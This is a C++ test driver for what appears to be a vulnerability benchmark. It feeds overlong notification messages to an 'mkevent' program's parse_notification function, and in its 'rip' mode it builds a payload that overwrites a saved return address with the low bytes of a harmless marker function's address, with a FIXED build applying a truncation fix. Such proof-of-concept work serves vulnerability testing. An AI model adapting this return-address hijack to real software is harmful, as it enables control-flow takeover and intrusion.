#define main mkevent_program_main
#include MKEVENT_SOURCE
#undef main

#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <iostream>
#include <span>
#include <string>
#include <vector>

__attribute__((noinline)) static void benign_marker() {
    std::fputs("BENIGN_MARKER\n", stdout);
    std::fflush(stdout);
    _exit(0);
}

int main(int argc, char **argv) {
    if (argc < 3) {
        std::cerr << "usage: driver fill LENGTH [BYTE] | rip OFFSET\n";
        return 64;
    }
    std::vector<char> text;
    if (std::strcmp(argv[1], "fill") == 0) {
        const std::size_t length = std::strtoull(argv[2], nullptr, 10);
        const int byte = argc > 3 ? std::strtol(argv[3], nullptr, 0) : 0x43;
        text.assign(length, static_cast<char>(byte));
        text.push_back('\0');
    } else if (std::strcmp(argv[1], "rip") == 0) {
        const std::size_t offset = std::strtoull(argv[2], nullptr, 10);
        const std::uintptr_t target = reinterpret_cast<std::uintptr_t>(&benign_marker);
        std::fprintf(stderr, "MARKER_ADDRESS=%p\n", reinterpret_cast<void *>(&benign_marker));
        text.assign(offset, 'A');
        // Non-PIE user-space code addresses share their high bytes. Overwrite
        // only the nonzero low bytes; parse_notification's terminator supplies
        // the first zero byte, as in a normal saved code pointer.
        for (unsigned i = 0; i < 3; ++i) {
            const unsigned char byte = (target >> (8 * i)) & 0xff;
            if (byte == 0) {
                std::cerr << "marker low bytes contain NUL; choose another build\n";
                return 65;
            }
            text.push_back(static_cast<char>(byte));
        }
        text.push_back('\0');
    } else {
        std::cerr << "unknown mode\n";
        return 64;
    }

    char facility[] = "1";
    char remote[] = "127.0.0.1";
    char state[] = "2";
    char hostname[] = "myhost";
    char service[] = "myservice";
    char sl[] = "10";
    char contact[] = "admin";
    char *args[] = {facility, remote, state, hostname, service, text.data(), sl, contact};
    auto notification = parse_notification(std::span<char *const>(args));
#ifdef FIXED
    notification->message.resize(truncated_length(notification->message));
#endif
    std::cout << "MESSAGE_SIZE=" << notification->message.size() << "\n";
    std::cout << notification->message << "\n";
    return 0;
}
